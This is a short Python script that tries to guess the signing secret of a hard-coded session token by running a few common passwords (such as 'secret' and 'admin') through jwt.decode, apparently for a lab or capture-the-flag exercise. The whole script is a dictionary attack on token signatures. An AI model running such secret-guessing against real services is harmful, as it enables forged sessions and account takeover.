import jwt
import itertools
token = "eyJ1c2VybmFtZSI6InBvb2wxIn0.aJbqQg.EpLKS4tUSnLcb7OOhsfUyDfrZUE"
common_secrets = ["secret", "password", "admin", "pool1", "123456"]
for secret in common_secrets:
    try:
        decoded = jwt.decode(token, key=secret, algorithms=["HS256"])
        print(f"Found secret: {secret}")
        break
    except jwt.InvalidSignatureError:
        continue